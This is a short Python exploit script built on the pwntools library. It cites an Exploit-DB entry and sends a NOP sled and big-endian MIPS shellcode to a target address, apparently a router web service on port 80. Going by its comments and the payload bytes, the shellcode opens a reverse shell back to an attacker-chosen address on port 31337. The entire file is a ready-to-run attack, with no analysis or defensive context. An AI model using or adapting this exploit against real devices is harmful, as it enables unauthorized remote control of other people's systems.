from pwn import *

# https://www.exploit-db.com/exploits/45541
# Big Endian 32 bit

def ip2hex(ip):
    """
    transfer ip string to hex string
    """
    res = []
    ip_list = ip.split(".")
    if len(ip_list) != 4:
        print("[-] Wrong reverse ip address!")
        exit(0)
    res_p1 = hex(int(ip_list[0]))[2:].rjust(2, "0")
    res_p2 = hex(int(ip_list[1]))[2:].rjust(2, "0")
    res1 = res_p1 + res_p2
    res_p1 = hex(int(ip_list[2]))[2:].rjust(2, "0")
    res_p2 = hex(int(ip_list[3]))[2:].rjust(2, "0")
    res2 = res_p1 + res_p2
    res.append(res1)
    res.append(res2)
    return res

def exploit(ip, port, rip):
    """
    :param ip: victim's ip address
    :param port: victim's port
    :param rip: reverse shell to rip:31337
    """
    shellcode_offset = 0x2828
    
    nop_sled = "01084026" * 150
    shellcode = nop_sled + "240ffffa01e0782721e4fffd21e5fffd2806ffff240210570101010cafa2ffff8fa4ffff340ffffd01e07827afafffe03c0e7a69" + \
                "35ce7a69afaeffe43c0e" + \
                rip[0] + "35ce" + rip[1] + \
                "afaeffe627a5ffe2240cffef018030272402104a0101010c240ffffd01e028278fa4ffff24020fdf0101010c24a" + \
                "5ffff2401ffff14a1fffb2806ffff3c0f2f2f35ef6269afafffec3c0e6e2f35ce7368afaefff0afa0fff427a4ffecafa4f" + \
                "ff8afa0fffc27a5fff824020fab0101010c" + nop_sled
    p = remote(ip, port)
    p.sendline(shellcode)
    p.close()

rip = ip2hex("127.0.0.1")
exploit("192.168.0.1", 80, rip)
